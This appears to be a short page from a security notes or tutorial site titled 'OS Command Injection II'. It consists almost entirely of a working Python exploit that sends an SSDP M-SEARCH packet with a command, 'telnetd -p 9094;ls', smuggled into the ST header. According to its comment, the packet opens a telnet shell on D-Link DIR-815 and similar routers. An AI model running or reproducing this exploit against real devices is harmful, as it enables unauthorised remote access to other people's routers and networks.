+++
title = "OS Command Injection II"
date = 2021-10-18T20:39:54-06:00
weight = 5
+++


## OS Command Injection II
```python
import socket
import struct

# This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN


buf = 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\r\nMX:2\r\nMAN:"ssdp:discover"\r\n\r\n'

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("239.255.255.250", 1900))
s.send(buf)
s.close()
```
